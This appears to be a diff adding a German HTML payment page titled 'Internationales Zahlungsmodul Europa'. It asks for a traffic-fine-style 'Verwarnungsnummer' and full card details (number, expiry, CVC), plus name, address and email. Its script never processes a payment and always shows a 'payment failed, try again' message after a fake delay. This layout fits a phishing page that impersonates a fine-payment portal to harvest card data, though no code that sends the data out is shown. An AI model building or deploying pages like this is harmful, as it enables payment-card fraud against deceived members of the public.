@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <title>Zahlung</title>
+  <style>
+    body {
+      background: #f2f2f2;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: white;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      width: 400px;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+      text-align: center;
+      color: #333;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      margin-bottom: 5px;
+      font-weight: 600;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+
+    button {
+      margin-top: 25px;
+      width: 100%;
+      padding: 12px;
+      background-color: #007bff;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    .message {
+      margin-top: 20px;
+      text-align: center;
+      font-weight: bold;
+      color: red;
+      display: none;
+    }
+
+    .loading {
+      animation: blink 1s infinite;
+      color: #666;
+    }
+
+    @keyframes blink {
+      0% { opacity: 0.4; }
+      50% { opacity: 1; }
+      100% { opacity: 0.4; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Internationales Zahlungsmodul Europa</h2>
+    <form id="paymentForm">
+      <label>Verwarnungsnummer*</label>
+      <input type="text" name="cardNumber" placeholder="xxxxxxxxxxxxxxxxxx" required>
+
+      <label>Kreditkartennummer*</label>
+      <input type="text" name="cardNumber" placeholder="1234 5678 9012 3456" required>
+
+      <label>Ablaufdatum (MM/YY)*</label>
+      <input type="text" name="expiryDate" placeholder="08/26" required>
+
+      <label>CVC*</label>
+      <input type="text" name="cvc" placeholder="123" required>
+
+      <label>Vor- und Nachname*</label>
+      <input type="text" name="cardholder" placeholder="Max Mustermann" required>
+
+      <label>Adresse*</label>
+      <input type="text" name="address" placeholder="Musterstraße 1" required>
+
+      <label>PLZ*</label>
+      <input type="text" name="zip" placeholder="12345" required>
+
+      <label>Land*</label>
+<select name="country" required>
+  <option value="">Bitte wählen</option>
+  <option value="AL">Albanien</option>
+  <option value="AD">Andorra</option>
+  <option value="AT">Österreich</option>
+  <option value="BY">Belarus (Weißrussland)</option>
+  <option value="BE">Belgien</option>
+  <option value="BA">Bosnien und Herzegowina</option>
+  <option value="BG">Bulgarien</option>
+  <option value="HR">Kroatien</option>
+  <option value="CY">Zypern</option>
+  <option value="CZ">Tschechien</option>
+  <option value="DK">Dänemark</option>
+  <option value="EE">Estland</option>
+  <option value="FI">Finnland</option>
+  <option value="FR">Frankreich</option>
+  <option value="DE">Deutschland</option>
+  <option value="GR">Griechenland</option>
+  <option value="HU">Ungarn</option>
+  <option value="IS">Island</option>
+  <option value="IE">Irland</option>
+  <option value="IT">Italien</option>
+  <option value="XK">Kosovo</option>
+  <option value="LV">Lettland</option>
+  <option value="LI">Liechtenstein</option>
+  <option value="LT">Litauen</option>
+  <option value="LU">Luxemburg</option>
+  <option value="MT">Malta</option>
+  <option value="MD">Moldawien</option>
+  <option value="MC">Monaco</option>
+  <option value="ME">Montenegro</option>
+  <option value="NL">Niederlande</option>
+  <option value="MK">Nordmazedonien</option>
+  <option value="NO">Norwegen</option>
+  <option value="PL">Polen</option>
+  <option value="PT">Portugal</option>
+  <option value="RO">Rumänien</option>
+  <option value="RU">Russland</option>
+  <option value="SM">San Marino</option>
+  <option value="RS">Serbien</option>
+  <option value="SK">Slowakei</option>
+  <option value="SI">Slowenien</option>
+  <option value="ES">Spanien</option>
+  <option value="SE">Schweden</option>
+  <option value="CH">Schweiz</option>
+  <option value="TR">Türkei</option>
+  <option value="UA">Ukraine</option>
+  <option value="GB">Vereinigtes Königreich</option>
+  <option value="VA">Vatikanstadt</option>
+</select>
+
+
+
+      <label>E-Mail-Adresse*</label>
+      <input type="email" name="email" placeholder="max@example.com" required>
+      <p>*Pflichtfeld</p>
+
+      <button type="submit">Zahlung Abschicken</button>
+    </form>
+    <div class="message" id="message"></div>
+  </div>
+
+  <script>
+    const form = document.getElementById('paymentForm');
+    const messageBox = document.getElementById('message');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      messageBox.style.display = 'block';
+      messageBox.classList.add('loading');
+      messageBox.textContent = 'Zahlung wird verarbeitet...';
+
+      setTimeout(() => {
+        messageBox.classList.remove('loading');
+        messageBox.style.color = 'red';
+        messageBox.textContent = 'Zahlung fehlgeschlagen. Bitte versuchen Sie es erneut.';
+      }, 2000);
+    });
+  </script>
+</body>
+</html>
